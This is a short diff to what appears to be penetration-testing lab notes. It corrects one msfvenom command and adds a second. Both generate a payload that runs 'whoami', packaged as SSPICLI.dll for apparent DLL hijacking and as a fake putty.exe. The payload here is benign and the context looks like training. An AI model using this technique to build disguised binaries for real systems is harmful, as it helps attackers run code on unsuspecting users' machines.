@@ -1,6 +1,7 @@
 ## Showcase
 ### Fake Payload
-    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\ssers\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f exe > putty.exe
 ____________________________________________________________________________________________________________________
 ## 
 ### 
